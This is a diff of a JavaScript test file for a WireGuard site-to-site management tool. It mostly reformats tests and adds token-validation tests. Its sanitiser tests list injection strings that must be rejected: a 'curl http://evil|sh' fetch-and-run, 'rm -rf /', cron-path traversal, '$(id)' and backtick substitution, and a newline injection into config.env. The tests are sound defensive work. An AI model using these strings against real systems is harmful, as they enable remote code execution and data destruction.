@@ -286,8 +286,11 @@ Endpoint = Proxy.Comnic.DE:51821`;
 test("_rewriteHubPeerEndpoint rewrites a stale host but keeps a trailing inline comment", () => {
 	const config = `[Peer]
 Endpoint = hub.comnic.de:51821 # primary`;
-	assert.equal(_rewriteHubPeerEndpoint(config, "proxy.comnic.de"), `[Peer]
-Endpoint = proxy.comnic.de:51821 # primary`);
+	assert.equal(
+		_rewriteHubPeerEndpoint(config, "proxy.comnic.de"),
+		`[Peer]
+Endpoint = proxy.comnic.de:51821 # primary`,
+	);
 });
 
 test("_rewriteHubPeerEndpoint tolerates whitespace around the colon", () => {
@@ -357,7 +360,12 @@ test("_collectSiteNetworks treats a link with no type as a site (safe default)",
 test("_collectSiteNetworks excludes client (road-warrior) reach-lists", () => {
 	const links = {
 		home: { name: "Floppy Home", type: "site-to-site", importedNetworks: ["192.168.11.0/24"] },
-		phone: { name: "iPhone Floppy", type: "client", exportedNetworks: [], importedNetworks: ["192.168.10.0/24", "192.168.11.0/24"] },
+		phone: {
+			name: "iPhone Floppy",
+			type: "client",
+			exportedNetworks: [],
+			importedNetworks: ["192.168.10.0/24", "192.168.11.0/24"],
+		},
 		laptop: { name: "Floppy Lappi", type: "client", importedNetworks: ["192.168.10.0/24", "10.10.0.0/24"] },
 	};
 	const nets = _collectSiteNetworks(links);
@@ -371,7 +379,13 @@ test("_collectSiteNetworks excludes client (road-warrior) reach-lists", () => {
 test("_computeOtherSiteNets full mesh = all site nets except own", () => {
 	const allSiteNets = new Set(["192.168.40.0/24", "192.168.60.0/24", "192.168.11.0/24"]);
 	const ownNets = new Set(["192.168.11.0/24"]);
-	const { nets } = _computeOtherSiteNets({ allowedNetworks: null, allowedSites: null, allSiteNets, ownNets, linksByName: new Map() });
+	const { nets } = _computeOtherSiteNets({
+		allowedNetworks: null,
+		allowedSites: null,
+		allSiteNets,
+		ownNets,
+		linksByName: new Map(),
+	});
 	assert.deepEqual(nets.sort(), ["192.168.40.0/24", "192.168.60.0/24"]);
 });
 
@@ -380,7 +394,13 @@ test("_computeOtherSiteNets full mesh = all site nets except own", () => {
 test("_computeOtherSiteNets intersects allowed_networks with live site nets, reports orphans", () => {
 	const allSiteNets = new Set(["192.168.20.0/24"]); // .10 was removed from its site
 	const allowedNetworks = new Set(["192.168.10.0/24", "192.168.20.0/24"]);
-	const { nets, orphans } = _computeOtherSiteNets({ allowedNetworks, allowedSites: null, allSiteNets, ownNets: new Set(), linksByName: new Map() });
+	const { nets, orphans } = _computeOtherSiteNets({
+		allowedNetworks,
+		allowedSites: null,
+		allSiteNets,
+		ownNets: new Set(),
+		linksByName: new Map(),
+	});
 	assert.deepEqual(nets, ["192.168.20.0/24"]);
 	assert.deepEqual(orphans, ["192.168.10.0/24"]);
 });
@@ -395,10 +415,22 @@ test("_computeOtherSiteNets allowed_sites ignores client links", () => {
 	]);
 	const ownNets = new Set();
 	// Whitelisting only the client must NOT admit the net.
-	const viaClient = _computeOtherSiteNets({ allowedNetworks: null, allowedSites: new Set(["iPhone Floppy"]), allSiteNets, ownNets, linksByName });
+	const viaClient = _computeOtherSiteNets({
+		allowedNetworks: null,
+		allowedSites: new Set(["iPhone Floppy"]),
+		allSiteNets,
+		ownNets,
+		linksByName,
+	});
 	assert.deepEqual(viaClient.nets, []);
 	// Whitelisting the real site admits it.
-	const viaSite = _computeOtherSiteNets({ allowedNetworks: null, allowedSites: new Set(["Floppy Home"]), allSiteNets, ownNets, linksByName });
+	const viaSite = _computeOtherSiteNets({
+		allowedNetworks: null,
+		allowedSites: new Set(["Floppy Home"]),
+		allSiteNets,
+		ownNets,
+		linksByName,
+	});
 	assert.deepEqual(viaSite.nets, ["192.168.11.0/24"]);
 });
 
@@ -406,13 +438,25 @@ test("_computeOtherSiteNets allowed_sites ignores client links", () => {
 
 test("sanitizeUnifiFields accepts clean values and a valid URL", () => {
 	const patch = {};
-	sanitizeUnifiFields({ unifi_url: "https://unifi.local:8443", unifi_user: "admin", unifi_pass: "s3cret-pw", unifi_site: "default" }, patch);
-	assert.deepEqual(patch, { unifi_url: "https://unifi.local:8443", unifi_user: "admin", unifi_pass: "s3cret-pw", unifi_site: "default" });
+	sanitizeUnifiFields(
+		{ unifi_url: "https://unifi.local:8443", unifi_user: "admin", unifi_pass: "s3cret-pw", unifi_site: "default" },
+		patch,
+	);
+	assert.deepEqual(patch, {
+		unifi_url: "https://unifi.local:8443",
+		unifi_user: "admin",
+		unifi_pass: "s3cret-pw",
+		unifi_site: "default",
+	});
 });
 
 test("sanitizeUnifiFields rejects config.env injection in pass/user (quote/newline/$/backtick)", () => {
 	for (const bad of ['p@ss"\nPRIMARY_URL="http://evil', "a`reboot`", "x$(id)", "back\\slash", "line\rbreak"]) {
-		assert.throws(() => sanitizeUnifiFields({ unifi_pass: bad }, {}), /not allowed in config\.env/, `should reject ${JSON.stringify(bad)}`);
+		assert.throws(
+			() => sanitizeUnifiFields({ unifi_pass: bad }, {}),
+			/not allowed in config\.env/,
+			`should reject ${JSON.stringify(bad)}`,
+		);
 	}
 });
 
@@ -447,8 +491,19 @@ test("sanitizeWgInterface accepts wg<number> and defaults falsy to wg0", () => {
 });
 
 test("sanitizeWgInterface rejects injection / traversal interface names", () => {
-	for (const bad of ['wg0"\ncurl http://evil|sh\n#', "../../etc/cron.d/x", "wg0; rm -rf /", "eth0", "wg0 ", "wg1234"]) {
-		assert.throws(() => sanitizeWgInterface(bad), /wg_interface must match/, `should reject ${JSON.stringify(bad)}`);
+	for (const bad of [
+		'wg0"\ncurl http://evil|sh\n#',
+		"../../etc/cron.d/x",
+		"wg0; rm -rf /",
+		"eth0",
+		"wg0 ",
+		"wg1234",
+	]) {
+		assert.throws(
+			() => sanitizeWgInterface(bad),
+			/wg_interface must match/,
+			`should reject ${JSON.stringify(bad)}`,
+		);
 	}
 });
 
@@ -532,7 +587,10 @@ test("buildLoopScript force-set producer joins all CIDRs and matches a literal [
 test("buildLoopScript installs a real CIDR overlap guard (not exact-match only)", () => {
 	const script = buildLoopScript("native");
 	assert.ok(script.includes("_net_overlaps"), "must define/use the overlap helper");
-	assert.ok(script.includes("ipaddress.ip_network") && script.includes(".overlaps("), "must use real CIDR containment, not grep -qxF alone");
+	assert.ok(
+		script.includes("ipaddress.ip_network") && script.includes(".overlaps("),
+		"must use real CIDR containment, not grep -qxF alone",
+	);
 });
 
 // Regression (Gap #1): the syncconf grep fallback must tolerate the "Address = "
@@ -549,7 +607,10 @@ test("buildLoopScript native syncconf fallback strips wg-quick keys with spaced 
 // native sync_routes stale-route reconciler.
 test("buildLoopScript unifi prunes stale FG-WG firewall rules on removal", () => {
 	const script = buildLoopScript("unifi");
-	assert.ok(script.includes("Removed stale FloppyGuard firewall rule"), "unifi apply must delete stale firewall rules");
+	assert.ok(
+		script.includes("Removed stale FloppyGuard firewall rule"),
+		"unifi apply must delete stale firewall rules",
+	);
 	assert.ok(script.includes("name[6:] not in keep"), "must keep only rules whose net is still in allowed_ips");
 });
 
@@ -714,10 +775,7 @@ test("buildLoopScript verifies a hub URL is reachable before adopting it, and up
 // $iface). See CHANGELOG 1.3.17.
 test("buildLoopScript substitutes %i -> $iface before eval'ing PostUp/PostDown", () => {
 	const script = buildLoopScript("native");
-	assert.ok(
-		script.includes('sed "s/%i/$iface/g"'),
-		"apply_config must replace %i with $iface before eval",
-	);
+	assert.ok(script.includes('sed "s/%i/$iface/g"'), "apply_config must replace %i with $iface before eval");
 	// Guard against regressing to a bare eval of the raw rule strings.
 	assert.ok(!/eval "\$old_postdown" 2>/.test(script), "must not eval old_postdown with literal %i");
 	assert.ok(!/eval "\$new_postup" 2>/.test(script), "must not eval new_postup with literal %i");
@@ -732,4 +790,25 @@ test("sanitizeAclSites coerces to trimmed non-empty strings, no CIDR check", () 
 	assert.equal(sanitizeAclSites("nope"), null);
 	assert.equal(sanitizeAclSites([]), null);
 	assert.equal(sanitizeAclSites(["", " "]), null);
+});
+
+// ─── token shape gate (MySQL VARCHAR/number coercion) ────────────────────────
+
+test("isWellFormedToken only accepts hex token strings", () => {
+	const { isWellFormedToken } = _testExports;
+	assert.equal(isWellFormedToken("a".repeat(64)), true);
+	assert.equal(isWellFormedToken("0123456789abcdef".repeat(4)), true);
+	for (const bad of [1, 5, true, false, null, undefined, {}, [], "5", "", "x".repeat(64), `${"a".repeat(63)}\n`]) {
+		assert.equal(isWellFormedToken(bad), false, JSON.stringify(bad));
+	}
+});
+
+test("register/getConfig reject non-string tokens before any DB lookup", async () => {
+	await assert.rejects(() => internalAgent.register(5), /Invalid registration token/);
+	await assert.rejects(() => internalAgent.register(true), /Invalid registration token/);
+	await assert.rejects(() => internalAgent.getInstallScriptByToken(1, "", ""), /Invalid registration token/);
+	await assert.rejects(() => internalAgent.getConfig(1), /Invalid agent token/);
+	await assert.rejects(() => internalAgent.heartbeat(7, {}), /Invalid agent token/);
+	await assert.rejects(() => internalAgent.uploadConfig(3, {}), /Invalid agent token/);
+	await assert.rejects(() => internalAgent.getLoopScript(9), /Invalid agent token/);
 });
